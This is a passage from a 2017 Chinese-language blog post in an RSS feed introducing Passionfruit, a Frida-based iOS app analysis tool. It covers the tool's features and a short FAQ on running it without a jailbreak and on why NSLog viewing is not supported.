可以直接根据反射打印出参数和返回值。&lt;/p&gt;&lt;p&gt;其他工具实现的 checksec 是基于 otool 检查应用的可执行文件，需要在设备上安装额外的依赖，或将文件从设备中同步到本地执行命令。Passionfruit 直接分析内存中映射的内容，因此要快上很多。在文件查看方面，Passionfruit 直接读取应用沙盒内的 Plist、SQLite 数据库，相比先 scp 下载然后查看可以节约一些时间。&lt;/p&gt;&lt;p&gt;Passionfruit 在不少界面都添加了搜索功能，如模块列表、导出符号、Objective C 类，甚至 Plist 这样的序列化数据。&lt;/p&gt;&lt;p&gt;在 iOS 10 中有一个非公开 API UIDebuggingInformationOverlay 可用来在设备上分析界面层级，您可以在 Passionfruit 的 UIDump 面板中点击按钮来激活这个界面。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-5dac5ae80092b44c7e266b9aa4937a67_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;1136&quot;&gt;&lt;p&gt;如果您有单步、界面分析等更高级的调试需求，建议还是使用 debugserver 等专门的调试工具。&lt;/p&gt;&lt;h2&gt;FAQ&lt;/h2&gt;&lt;p&gt;&lt;b&gt;需要越狱吗？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;更新：项目发布后收到了 frida 作者本尊贡献的代码，现在已经不需要越狱了！&lt;/p&gt;&lt;p&gt;Frida 可以通过对已砸壳的 ipa 添加 fridagadget.dylib，重打包、重签名后在非越狱设备上试用，具体步骤可参考： &lt;a href=&quot;http://www.jianshu.com/p/ce2770c42ead&quot;&gt;iOS App的Patching和Resigning&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;为什么不支持 NSLog 查看？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;本工具使用的界面是基于浏览器的，对于 NSLog 日志这种快速刷新的内容，实时展示会造成显著的性能问题。在现有工具（Xcode，macOS 自带的 Console，libimoviledevice 的 idevicesyslog 命令）足够强大的情况下，没有必要再开发一个（更难用的）了。&lt;/p&gt;</description>
-<author>0xCC</author>
-<guid isPermaLink="false">2017-10-15-29761306</guid>
-<pubDate>Sun, 15 Oct 2017 00:00:00 +0800</pubDate>
 </item>
 </channel>
 </rss>
